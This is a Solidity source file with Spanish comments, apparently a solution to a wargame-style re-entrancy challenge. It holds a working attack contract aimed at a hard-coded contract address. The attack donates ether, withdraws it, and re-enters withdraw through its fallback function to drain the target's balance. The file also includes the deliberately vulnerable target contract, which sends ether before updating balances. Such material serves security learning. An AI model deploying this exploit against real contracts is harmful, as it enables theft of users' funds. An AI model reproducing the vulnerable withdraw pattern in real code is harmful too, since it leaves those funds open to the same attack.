// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.12;
pragma solidity ^0.8.12;

// import "openzeppelin-contracts-06/math/SafeMath.sol";
import "./SafeMath.sol";

/* obtenemos cuanto eth tiene el contrato y enviamos la misma cantidad */
/* despues hacemos withdraw -> golpeara nuestro fallback -> hacemos re-entrancy attack --> RESULTADO hacemos withdraw 2 veces, cogiendo todo el eth del contrato objetivo */
contract ReentranceAttack {
    Reentrance ReentranceContract =
        Reentrance(payable(0x518A3Ce1C2974Ecf2f1E15e399E3DBA544C99b6f));

    uint public oBalance;
    uint public callsAmount;

    constructor() payable {
        /* get objetive contract eth balance */
        oBalance = address(this).balance;
    }

    function donateAttack() public payable {
        /* DONATE */
        /* @remind en caso de equivocarnos con la signatura de la funcion. En este caso como msg.data no es empty, 
        pegaria en fallback y se revertiria la tx. En caso de que tuviese un fallback payable, nos quedariamos sin el dinero y sin poder retirarlo.
        nos referimos al fallback del "Reentrance" SM
         */
        (bool success, ) = payable(address(ReentranceContract)).call{
            value: oBalance
        }(abi.encodeWithSignature("donate(address)", address(this))); // ,{value: 0.0001 ether}
        require(success, "donate fail");
    }

    function withdrawAttack() public payable {
        /* WITHDRAW */
        uint before = address(this).balance;

        ReentranceContract.withdraw(oBalance);

        uint afterAttack = address(this).balance;
        require(afterAttack > before, "failure re-entrancy attack ");
    }

    fallback() external payable {
        uint _oBalance = address(ReentranceContract).balance;
        if (_oBalance >= oBalance) withdrawAttack();
        callsAmount++;
    }
}

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
